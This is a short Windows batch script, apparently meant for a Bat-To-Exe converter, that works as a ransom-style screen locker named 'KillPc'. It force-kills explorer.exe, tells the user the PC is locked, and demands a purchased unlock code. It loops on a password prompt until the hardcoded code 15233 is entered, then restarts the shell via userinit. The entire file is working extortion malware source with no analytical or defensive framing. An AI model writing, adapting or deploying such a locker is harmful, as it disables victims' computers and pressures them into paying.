::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJiZk4aHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsGAlHi
::ZQ05rAF9IAHYFVzEqQIbIRdYfAfi
::eg0/rx1wNQPfEVWB+kM9LVsJDC+LMGeKBdU=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIDKR1RDDCNfFmvCNU=
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFC5HSRa+GG6pDaET+NTQ5uaLkk5TUfo6GA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
taskkill /f /im explorer.exe
cls
echo Your PC is locked by KillPc
echo To unlock it you need to buy a unlock code
set Code=""

:Code
set /p code="Enter Code:"
if "%code%"=="15233" goto Correct
if NOT "%code%"=="15233" goto Wrong

:Correct
start userinit
echo Correct Code
pause
exit

:Wrong
echo Wrong Code, Try again
goto Code